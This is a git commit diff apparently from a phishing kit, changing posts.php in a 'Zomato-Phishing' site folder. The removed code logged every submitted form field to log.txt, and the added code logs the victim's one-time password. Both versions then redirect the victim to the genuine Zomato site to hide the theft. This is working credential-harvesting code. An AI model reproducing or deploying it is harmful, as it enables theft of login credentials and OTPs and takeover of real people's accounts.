71bf32e9537c8f2684effad0378555321632b0af
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-09-06 12:17:39 -0400

    Add files via upload

--- sites/Zomato-Phishing/posts.php
+++ sites/Zomato-Phishing/posts.php
@@ -1,13 +1,5 @@
 <?php
-header ('Location: https://www.zomato.com');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
+header('Location: https://www.zomato.com');
+exit();
